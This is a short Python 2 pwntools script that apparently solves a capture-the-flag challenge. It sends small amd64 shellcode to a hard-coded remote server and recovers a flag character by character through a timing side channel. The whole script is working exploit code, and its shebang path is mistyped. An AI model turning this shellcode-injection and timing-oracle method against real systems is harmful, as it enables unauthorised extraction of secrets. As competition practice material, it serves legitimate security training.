#!/sur/bin/env python2
from pwn import *
import string
import traceback
import time
#context.log_level = 'debug'

context.arch = 'amd64'
compare = asm('''
    syscall
    cmp BYTE PTR [rcx+7], 0x68
    A:
    jz A
''')

print len(compare)

flag = ''
start = 0

def run():
    global flag, compare
    for i in range(57):
        for c in '_{}abcdefghijklmnopqrstuvwxyz0123456789':
            print 'match {}th: {}'.format(i, c)
            r = remote('195.201.127.119', 8664)
            try:
                compare = compare[:5] + c + compare[6:]
                r.sendlineafter('today?\n', str(i))
                r.sendafter('please.\n', compare)
                start = time.time()
                r.recv(timeout=5)

            except:
                # vpn to germany to get more stablity
                if time.time() - start > 3:
                    flag += c
                    r.close()
                    print 'flag:', flag
                    break
                r.close()

def test():
    global compare
    r = remote('195.201.127.119', 8664)
    compare = compare[:5] + 'h' + compare[6:]
    r.sendlineafter('today?\n', str(0))
    r.sendafter('please.\n', compare)
    start = time.time()
    try:
        r.recv(timeout=10)
    except:
        end = time.time()
        print end - start

run()
